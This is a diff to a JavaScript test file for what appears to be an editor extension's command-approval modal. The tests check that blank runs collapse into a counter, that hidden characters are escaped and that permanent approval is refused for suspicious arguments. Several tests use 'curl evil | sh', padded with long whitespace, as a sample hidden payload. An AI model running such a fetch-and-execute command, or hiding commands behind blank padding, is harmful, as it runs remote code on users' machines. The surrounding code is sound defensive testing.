@@ -507,7 +507,7 @@ async function projectRun(items, answer) {
 }
 
 test('SEC-7: the modal shows long args fully escaped, marks truncation and refuses permanent approval', async () => {
-  const args = [' '.repeat(320) + '; curl evil | sh'];
+  const args = ['a'.repeat(60) + ' '.repeat(40) + '; curl evil | sh'];
   const t = await projectRun([{ name: 'X', command: 'workbench.action.terminal.sendSequence', args }], 'Executar e lembrar');
   await t.send({ type: 'run', id: t.ids[0] });
   assert.equal(t.warnings.length, 1);
@@ -608,4 +608,60 @@ test('QA-10: restoreFold never replaces a pending focusGroup or openEditor', asy
   assert.equal(t.provider.pending.message.type, 'focusGroup');
   await t.send({ type: 'ready' });
   assert.equal(t.messages.filter(m => m.type === 'focusGroup').length, 2, 'the navigation is still redelivered');
+});
+
+test('SEC-13: long blank runs collapse in the preview; mostly-blank args are run-once only', async () => {
+  const hidden = await projectRun([{ name: 'B', command: 'some.cmd', args: [' '.repeat(1400) + 'curl evil | sh'] }], 'Executar e lembrar');
+  await hidden.send({ type: 'run', id: hidden.ids[0] });
+  const d = hidden.warnings[0][1].detail;
+  assert.ok(d.includes('␠×1400'), 'counter instead of the run');
+  assert.ok(d.includes('curl evil | sh'), 'payload in view');
+  assert.ok(!/ {10}/.test(d));
+  assert.deepEqual(hidden.warnings[0].slice(2), ['Executar uma vez'], 'mostly blank: no remember');
+  assert.equal(hidden.context.workspaceState.get('approvedItems', []).length, 0);
+  const tabs = await projectRun([{ name: 'T', command: 'some.cmd', args: ['	'.repeat(300) + 'x'] }], undefined);
+  await tabs.send({ type: 'run', id: tabs.ids[0] });
+  assert.ok(tabs.warnings[0][1].detail.includes('␠×300'));
+  const ok = await projectRun([{ name: 'S', command: 'some.cmd', args: ['a b  c'] }], undefined);
+  await ok.send({ type: 'run', id: ok.ids[0] });
+  assert.ok(ok.warnings[0].slice(2).includes('Executar e lembrar'), 'normal args can still be remembered');
+});
+
+test('SEC-15: actions that write user settings are not in the no-prompt list', async () => {
+  const cmds = ['workbench.action.toggleStatusbarVisibility', 'workbench.action.toggleActivityBarVisibility'];
+  const t = await projectRun(cmds.map((command, i) => ({ name: 'n' + i, command })), undefined);
+  for (const id of t.ids) await t.send({ type: 'run', id });
+  assert.equal(t.warnings.length, 2);
+  assert.equal(t.calls.length, 0);
+  const src = require('node:fs').readFileSync(require('node:path').join(root, 'src', 'tools-view.js'), 'utf8');
+  const list = src.slice(src.indexOf('const SAFE_ACTIONS'), src.indexOf('const isSafeProjectCommand'));
+  assert.equal((list.match(/'workbench.action.[A-Za-z0-9.]+'/g) || []).length, 12);
+});
+
+test('SEC-16: characters above U+FFFF are shown as a braced escape', async () => {
+  const tag = String.fromCodePoint(0xE0041);
+  const t = await projectRun([{ name: 'Tag' + tag, command: 'some.cmd', args: ['a' + tag + 'b'] }], undefined);
+  await t.send({ type: 'run', id: t.ids[0] });
+  const d = t.warnings[0][1].detail;
+  assert.ok(d.includes('\\u{E0041}'));
+  assert.ok(!d.includes(tag));
+});
+
+test('SEC-14: on activation non-hash approvals are dropped, favorites capped, legacy favorites hashed when the item exists', async () => {
+  const { favoriteKey, favoriteHash } = require('../src/config');
+  const item = { name: 'A', command: 'workbench.view.explorer' };
+  const t = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [item] }] } });
+  const ws = t.context.workspaceState;
+  const many = Array.from({ length: 700 }, (_, i) => 'h:' + String(i).padStart(64, '0'));
+  await ws.update('favorites', [favoriteKey(item), favoriteKey({ name: 'Gone', command: 'x.y', args: ['secret'] }), 42, ...many]);
+  await ws.update('approvedItems', ['["cmd","n",["secret"]]', 'h:' + 'a'.repeat(64)]);
+  await t.provider.migrateState();
+  const fav = ws.get('favorites');
+  assert.equal(fav[0], favoriteHash(item), 'existing legacy favorite converted, order kept');
+  assert.equal(fav.length, 500);
+  assert.ok(!JSON.stringify(fav).includes('secret') && fav.every(k => k.startsWith('h:')));
+  assert.deepEqual(ws.get('approvedItems'), ['h:' + 'a'.repeat(64)]);
+  await t.provider.resolveWebviewView(t.view);
+  await t.send({ type: 'ready' });
+  assert.equal(t.messages.at(-1).groups[0].items[0].favorite, true, 'the converted favorite still shows');
 });
